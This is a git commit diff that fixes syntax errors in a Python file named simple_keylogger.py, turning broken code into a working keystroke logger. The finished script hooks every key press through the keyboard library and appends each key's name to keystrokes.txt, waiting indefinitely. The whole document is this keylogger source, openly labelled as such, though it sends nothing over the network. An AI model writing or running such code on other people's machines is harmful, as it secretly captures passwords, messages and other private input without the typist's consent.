ab5e5fae73c04c6d0fd6b69fd17ea53e41fb3447
Basile Asougan <142254238+basileatsougan@users.noreply.github.com>
2024-07-20 23:06:46 +0300

    Update simple_keylogger.py

--- simple_keylogger.py
+++ simple_keylogger.py
@@ -1,13 +1,13 @@
 import keyboard
 
 # Function to handle key press events and log them to a file
-def keyPressed(event)
+def keyPressed(event):
   # Open the log file in 'append' mode (creates it if it doesn't exist)
-  witn open("keystrokes.txt", 'a') as f:
+  with open("keystrokes.txt", 'a') as f:
     # Write the name of the pressed key to the file, followed by a newline
-    f.write('{}\n'.format(event.name)
+    f.write('{}\n'.format(event.name))
 
-keyboard.onpress(keyPressed)
+keyboard.on_press(keyPressed)
 
 # we want our program to wait until a key is pressed before it exits.
 keyboard.wait()
